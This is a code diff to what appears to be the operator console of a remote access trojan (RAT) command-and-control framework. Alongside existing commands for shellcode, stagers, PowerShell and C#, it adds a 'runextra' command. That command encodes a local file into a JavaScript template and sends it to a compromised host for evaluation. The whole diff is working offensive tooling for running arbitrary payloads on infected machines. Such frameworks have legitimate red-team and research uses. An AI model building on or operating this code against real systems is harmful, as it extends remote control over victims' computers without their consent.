@@ -64,7 +64,7 @@ notes = {}
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
     def __init__(self):
-        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path"]
+        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path", "runextra"]
         self.re_space = re.compile('.*\s+$', re.M)
 
     def add_tab_item(self, item):
@@ -127,6 +127,9 @@ class Completer(object):
         return self._complete_path(args[0])
 
     def complete_eval(self, args):
+        return self._complete_path(args[0])
+
+    def complete_runextra(self, args):
         return self._complete_path(args[0])
 
     def complete_remove(self, args):
@@ -823,6 +826,21 @@ if __name__ == "__main__":
                                     inp = "ev " + encode_file(filepath)
                             except:
                                 pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
+                                continue
+
+                        elif(str.startswith(inp, "runextra ")):
+                            try:
+                                filepath = inp.split(" ")[1]
+                                if(types[ratID] == "ps1" or types[ratID] == "c#"):
+                                    pretty_print("[!] Runextra is not supported for PS1 or C# rats")
+                                    continue
+                                else:
+                                    with open(os.getcwd() + "/resources/run_extra.js", "r") as fd:
+                                        run_extra_data = fd.read()
+                                    inp = "ev " + base64.b64encode(run_extra_data.replace("~~EXTRAB64~~", encode_file(filepath)).encode('utf-8')).decode('utf-8')
+                            except Exception as e:
+                                pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
+                                pretty_print(str(e))
                                 continue
 
                         elif(str.startswith(inp, "cs ") or str.startswith(inp, "csharp ")):
